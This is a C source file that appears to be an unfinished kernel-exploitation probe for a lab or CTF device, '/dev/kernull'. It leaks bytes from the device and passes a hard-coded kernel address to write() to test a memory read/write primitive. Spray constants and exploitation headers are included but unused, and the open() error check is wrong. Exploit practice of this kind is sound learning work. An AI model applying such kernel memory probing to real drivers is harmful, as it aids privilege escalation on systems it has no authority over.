#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>
#define MSG_SPRAY_SIZE 0x10
#define SPRAY_SIZE 0x200


unsigned long RDRW_SIZE;

int kfd;


typedef struct{
    unsigned long index;
    char* buff;
    char* password;
}req_t;

req_t *req;


int main(int argc, char* argv[]){
    RDRW_SIZE = 0x1000;
    kfd = open("/dev/kernull", O_RDWR);
    if(kfd == 0){
        puts("failed to open device");
        exit(1);
    }

    printf("[*] kernull opened at %d\n", kfd);

    char* chef = malloc(RDRW_SIZE);

    memset(chef, 0, RDRW_SIZE);

    read(kfd,chef,RDRW_SIZE);
    
    for(int i =0; i<RDRW_SIZE;i++){
        if(chef[i])
            printf("byte at [%d]: %hhx\n", i, chef[i]);
    }
    
    memset(chef, 0x41, RDRW_SIZE);
    
    write(kfd,(void*) 0xffffffffa0002000, RDRW_SIZE);
    //memset(chef, 0, RDRW_SIZE);

    read(kfd,chef,RDRW_SIZE);
    
    for(int i =0; i<10;i++){
        if(chef[i])
            printf("byte at [%d]: %hhx\n", i, chef[i]);
    }

    return 0;
}
